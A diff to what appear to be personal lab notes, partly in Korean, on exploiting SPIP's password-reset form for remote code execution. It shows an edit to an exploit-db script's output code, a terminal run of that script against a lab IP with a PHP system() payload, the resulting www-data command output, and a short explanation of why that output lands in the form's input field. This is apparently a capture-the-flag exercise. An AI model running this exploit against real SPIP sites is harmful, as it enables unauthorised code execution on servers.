@@ -370,11 +370,23 @@ def send_payload(url, payload):
     r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
     if options.verbose:
         print("[+] Execute this payload : %s" % payload)
-    print("---------------------------------")
-    # 응답 본문 전체를 출력하여 사용자가 'id' 명령어의 결과를 직접 찾도록 합니다.
-    print(r.text)
-    print("---------------------------------")
-    # --- 결과 전체 출력 로직 추가 끝 ---
+        print(r.text) # 한줄 추가
 
     return 0
 ```
+
+┌──(root㉿docker-desktop)-[/]
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.94.100/spip/spip.php -c "id" --verbose
+[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
+[+] Execute this payload : s:22:"<?php system('id'); ?>";
+
+# result in input tag value
+
+> SPIP 취약점 익스플로잇 결과가 <input> 태그의 value 속성에 들어가는 이유는,
+> 해당 취약점이 비밀번호 재설정 폼의 이메일 입력값(oubli)을 PHP 코드로 처리하면서
+> 명령 실행 결과를 그대로 value에 넣기 때문입니다.
+> 즉, 악성 페이로드가 이메일 입력값으로 들어가고,
+> 서버에서 system() 함수로 명령을 실행한 뒤
+> 그 결과를 다시 이메일 입력값의 value로 반환합니다.
+
+<input type="email" class="text email" autofocus="autofocus" required="required" name='oubli' id='oubli' value="s:22:"uid=33(www-data) gid=33(www-data) groups=33(www-data)
